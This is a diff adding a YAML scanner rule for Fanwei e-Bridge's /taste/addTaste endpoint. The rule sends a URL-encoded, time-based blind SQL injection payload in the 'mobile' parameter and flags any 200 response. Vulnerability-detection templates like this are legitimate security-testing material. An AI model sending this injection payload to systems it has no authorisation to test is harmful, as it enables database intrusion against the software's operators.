@@ -1,0 +1,12 @@
+cve-id: fanwei-eBridge-addTaste-sqli
+rules:
+- method: GET
+  path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(2-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX
+  headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101
+      Firefox/56.0
+    Accept-Encoding: gzip, deflate
+  expression: 'response.status == 200 '
+severity: info
+type: sqli
